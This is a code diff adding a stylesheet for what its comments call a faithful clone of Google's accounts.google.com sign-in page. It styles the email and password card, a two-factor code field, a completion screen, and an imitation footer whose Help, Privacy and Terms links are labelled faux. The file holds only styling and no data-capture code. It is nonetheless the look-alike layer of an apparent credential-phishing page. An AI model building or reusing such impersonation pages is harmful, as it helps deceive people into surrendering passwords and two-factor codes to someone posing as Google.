@@ -1,0 +1,311 @@
+/* Google Sign-In clone — faithful reproduction of accounts.google.com
+   (2024-2026 look). White page, centered card, Roboto/Google Sans, Material
+   outlined fields, pill-shaped blue buttons, Google blue links. */
+
+* { box-sizing: border-box; }
+
+body {
+  margin: 0;
+  min-height: 100vh;
+  background: #fff;
+  font-family: "Google Sans", Roboto, "Helvetica Neue", Arial, sans-serif;
+  color: #202124;
+  display: grid;
+  place-items: center;
+  -webkit-font-smoothing: antialiased;
+}
+
+.hidden { display: none !important; }
+
+/* ---- centered card ---- */
+.g-card {
+  width: 450px;
+  max-width: calc(100vw - 32px);
+  border: 1px solid #dadce0;
+  border-radius: 8px;
+  box-shadow: 0 1px 3px rgba(60, 64, 67, 0.12), 0 1px 2px rgba(60, 64, 67, 0.08);
+  padding: 48px 40px 36px;
+  background: #fff;
+}
+
+/* ---- logo ---- */
+.g-logo {
+  display: flex;
+  justify-content: center;
+  margin-bottom: 16px;
+}
+.g-logo svg { width: 48px; height: 48px; }
+
+/* ---- headings ---- */
+.g-title {
+  margin: 0 0 8px;
+  font-size: 24px;
+  font-weight: 400;
+  line-height: 1.333;
+  text-align: center;
+}
+.g-title.app { font-size: 32px; line-height: 1.25; }
+.g-subtitle {
+  margin: 0 0 32px;
+  font-size: 16px;
+  line-height: 1.5;
+  text-align: center;
+  color: #202124;
+}
+.g-subtitle small { display: block; font-size: 14px; color: #5f6368; }
+.g-caption { font-size: 14px; color: #5f6368; text-align: center; margin: 0 0 24px; line-height: 1.5; }
+
+/* ---- the account you're signing into (password screen) ---- */
+.g-account {
+  display: flex;
+  align-items: center;
+  gap: 12px;
+  justify-content: center;
+  margin: 0 auto 24px;
+  color: #202124;
+  font-size: 14px;
+}
+.g-account .initials {
+  width: 42px; height: 42px; border-radius: 50%;
+  background: #aecbfa; color: #185abc; font-weight: 500;
+  display: grid; place-items: center; font-size: 18px; flex: none;
+}
+.g-account .who { line-height: 1.3; }
+.g-account .who .email { color: #5f6368; font-family: Roboto, Arial, sans-serif; }
+
+/* ---- Material outlined field ---- */
+.g-field {
+  position: relative;
+  margin: 0 0 10px;
+}
+.g-field input {
+  width: 100%;
+  height: 56px;
+  padding: 0 16px;
+  font-size: 16px;
+  color: #202124;
+  background: transparent;
+  border: 1px solid #dadce0;
+  border-radius: 4px;
+  outline: none;
+  transition: border-color .15s, box-shadow .15s, background .15s;
+}
+.g-field input::placeholder { color: transparent; }
+.g-field label {
+  position: absolute;
+  left: 16px;
+  top: 50%;
+  transform: translateY(-50%);
+  color: #5f6368;
+  font-size: 16px;
+  pointer-events: none;
+  transition: all .15s ease;
+  background: #fff;
+  padding: 0 4px;
+}
+.g-field input:focus {
+  border: 2px solid #0b57d0;
+  padding-left: 15px; /* keep text at same spot despite thicker border */
+}
+.g-field input:focus ~ label,
+.g-field input:not(:placeholder-shown) ~ label {
+  top: 0;
+  transform: translateY(-50%);
+  font-size: 12px;
+  color: #0b57d0;
+}
+.g-field input:focus ~ label { color: #0b57d0; }
+.g-field input:not(:placeholder-shown):not(:focus) ~ label { color: #5f6368; }
+/* hint / helper under a field */
+.g-hint { font-size: 12px; color: #5f6368; margin: -4px 0 8px; padding-left: 16px; }
+
+/* ---- show-password ---- */
+.g-show {
+  display: inline-flex;
+  align-items: center;
+  gap: 8px;
+  margin: 4px 0 0;
+  font-size: 14px;
+  font-family: Roboto, Arial, sans-serif;
+  color: #3c4043;
+  cursor: pointer;
+}
+.g-show input { width: 16px; height: 16px; accent-color: #0b57d0; cursor: pointer; }
+
+/* ---- links ---- */
+.g-link {
+  color: #0b57d0;
+  font-size: 14px;
+  font-weight: 500;
+  text-decoration: none;
+  cursor: pointer;
+  background: none;
+  border: none;
+  padding: 4px;
+  border-radius: 4px;
+}
+.g-link:hover { background: rgba(66, 133, 244, 0.08); }
+
+/* ---- footer with guest hint + Next button ---- */
+.g-footer {
+  margin-top: 32px;
+  display: flex;
+  align-items: center;
+  justify-content: space-between;
+  gap: 12px;
+}
+.g-guest {
+  font-size: 13px;
+  color: #5f6368;
+  line-height: 1.4;
+}
+.g-guest .g-link { font-size: 13px; padding: 0; }
+
+/* ---- Google pill button ---- */
+.g-btn {
+  background: #0b57d0;
+  color: #fff;
+  border: none;
+  border-radius: 20px;
+  height: 40px;
+  min-width: 96px;
+  padding: 0 24px;
+  font-family: "Google Sans", Roboto, Arial, sans-serif;
+  font-size: 15px;
+  font-weight: 500;
+  cursor: pointer;
+  box-shadow: 0 1px 2px rgba(60, 64, 67, 0.3);
+  transition: background .15s, box-shadow .15s;
+}
+.g-btn:hover { background: #1b66c9; box-shadow: 0 1px 3px rgba(60, 64, 67, 0.4); }
+.g-btn:active { background: #1c5fad; box-shadow: 0 1px 3px rgba(60, 64, 67, 0.4), 0 4px 8px rgba(60, 64, 67, 0.3); }
+.g-btn:disabled { background: #8ab4f8; cursor: default; box-shadow: none; }
+
+/* ---- loading state (spinner in place of the label, like Google's progress) ---- */
+.g-btn { display: inline-flex; align-items: center; justify-content: center; gap: 8px; }
+.g-btn.loading { pointer-events: none; }
+.g-btn .spin {
+  display: none;
+  width: 18px;
+  height: 18px;
+  border: 2px solid rgba(255, 255, 255, 0.35);
+  border-top-color: #fff;
+  border-radius: 50%;
+  animation: gspin 0.65s linear infinite;
+}
+.g-btn .b-label { transition: opacity .15s; }
+.g-btn.loading .b-label { opacity: 0; }
+.g-btn.loading .spin { display: inline-block; }
+@keyframes gspin { to { transform: rotate(360deg); } }
+
+/* ---- 2FA code entry (6 boxes look) ---- */
+.g-code {
+  text-align: center;
+  margin: 8px 0 0;
+}
+.g-code input {
+  width: 100%;
+  height: 56px;
+  padding: 0 16px;
+  font-size: 24px;
+  text-align: center;
+  letter-spacing: 8px;
+  color: #202124;
+  border: 1px solid #dadce0;
+  border-radius: 4px;
+  outline: none;
+  font-family: "Google Sans", Roboto, Arial, sans-serif;
+}
+.g-code input:focus { border: 2px solid #0b57d0; }
+
+/* ---- authentic Google bottom footer (Help · Privacy · Terms + language) ---- */
+.g-footerbar {
+  position: fixed;
+  left: 0;
+  right: 0;
+  bottom: 0;
+  display: flex;
+  align-items: center;
+  justify-content: space-between;
+  gap: 16px;
+  padding: 16px 24px;
+  border-top: 1px solid #dadce0;
+  background: #fff;
+  font-family: Roboto, Arial, sans-serif;
+  font-size: 13px;
+}
+.g-foot-left {
+  display: flex;
+  align-items: center;
+  gap: 4px;
+}
+.g-foot-link {
+  background: none;
+  border: none;
+  color: #5f6368;
+  font-size: 13px;
+  font-family: Roboto, Arial, sans-serif;
+  padding: 6px 12px;
+  border-radius: 4px;
+  cursor: pointer;
+}
+.g-foot-link:hover { background: rgba(60, 64, 67, 0.08); color: #3c4043; }
+.g-foot-lang {
+  display: flex;
+  align-items: center;
+  gap: 6px;
+  color: #5f6368;
+  cursor: pointer;
+  padding: 6px 12px;
+  border-radius: 4px;
+}
+.g-foot-lang:hover { background: rgba(60, 64, 67, 0.08); color: #3c4043; }
+.g-foot-lang svg { opacity: .7; }
+
+/* ---- toast (used by the faux Help/Privacy/Terms footer links) ---- */
+.g-toast {
+  position: fixed;
+  left: 50%;
+  bottom: 72px;
+  transform: translateX(-50%) translateY(10px);
+  background: #3c4043;
+  color: #fff;
+  font-size: 13px;
+  font-family: Roboto, Arial, sans-serif;
+  padding: 10px 18px;
+  border-radius: 8px;
+  box-shadow: 0 4px 12px rgba(60, 64, 67, .25);
+  opacity: 0;
+  pointer-events: none;
+  transition: opacity .2s, transform .2s;
+  max-width: calc(100vw - 40px);
+  text-align: center;
+  z-index: 10;
+}
+.g-toast.show { opacity: 1; transform: translateX(-50%) translateY(0); }
+
+/* ---- done screen ---- */
+.g-done-icon {
+  display: grid; place-items: center;
+  width: 64px; height: 64px; border-radius: 50%;
+  margin: 8px auto 16px;
+}
+.g-done-text { text-align: center; color: #202124; line-height: 1.5; }
+.g-done-text p { margin: 4px 0; font-size: 14px; color: #5f6368; }
+
+@media (max-width: 520px) {
+  .g-card { padding: 40px 24px 28px; box-shadow: none; border: none; }
+}
+
+/* ---- browser/error screen ---- */
+.g-screen { width: 100%; }
+.g-center { text-align: center; }
+.oops {
+  background: #fce8e6;
+  color: #c5221f;
+  border: 1px solid #f5c6c3;
+  border-radius: 6px;
+  padding: 10px 14px;
+  font-size: 14px;
+  text-align: center;
+}
